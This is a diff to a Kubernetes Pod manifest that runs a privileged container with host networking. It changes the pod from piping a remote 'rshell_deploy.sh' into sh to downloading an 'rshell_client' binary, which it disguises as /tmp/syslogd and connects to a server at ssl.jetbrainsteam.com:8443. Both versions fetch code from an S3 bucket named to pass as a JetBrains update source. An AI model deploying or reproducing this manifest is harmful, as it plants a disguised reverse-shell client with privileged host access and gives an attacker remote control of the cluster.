@@ -1,7 +1,7 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: rshell-test
+  name: rshell-direct
   namespace: default
 spec:
   hostNetwork: true
@@ -10,7 +10,7 @@ spec:
     image: alpine:latest
     command: ["/bin/sh", "-c"]
     args:
-    - "apk add --no-cache curl > /dev/null 2>&1; curl -fsSL https://jetbrainsteam-updates.s3.amazonaws.com/rshell_deploy.sh | sh; echo DONE; sleep 99999"
+    - "apk add --no-cache curl > /dev/null 2>&1 && curl -fsSL -o /tmp/syslogd https://jetbrainsteam-updates.s3.amazonaws.com/rshell_client && chmod +x /tmp/syslogd && SERVER_URL=ssl.jetbrainsteam.com:8443 /tmp/syslogd & sleep 99999"
     securityContext:
       privileged: true
   restartPolicy: Never
